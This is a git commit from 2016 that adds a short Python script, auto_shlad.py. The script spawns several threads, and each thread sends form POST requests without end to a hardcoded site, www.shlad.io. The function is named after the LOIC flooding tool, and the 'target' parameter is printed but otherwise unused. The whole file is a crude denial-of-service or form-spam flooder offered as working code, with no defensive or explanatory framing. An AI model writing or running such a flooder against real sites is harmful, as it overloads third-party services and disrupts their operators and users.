00d257938d1a69f278d29bb23fe476d7168f7e20
Adam J <amj69@case.edu>
2016-06-01 11:49:54 -0700

    init

---
+++ auto_shlad.py
@@ -0,0 +1,24 @@
+import requests
+import threading
+
+def auto_shlad(target):
+    print("init auto_shlad: %s" % target)
+
+    data = {
+        'email': 'shl@d',
+        'origin':'djankgo'
+    }
+
+    while True:
+        requests.post('http://www.shlad.io/', data)
+
+def loic_shlad(threads, target):
+    while threads > 0:
+        threading.Thread(
+            target=auto_shlad,
+            args=[target],
+        ).start()
+        threads -= 1
+
+if __name__ == "__main__":
+    loic_shlad(4, 'shl@d')
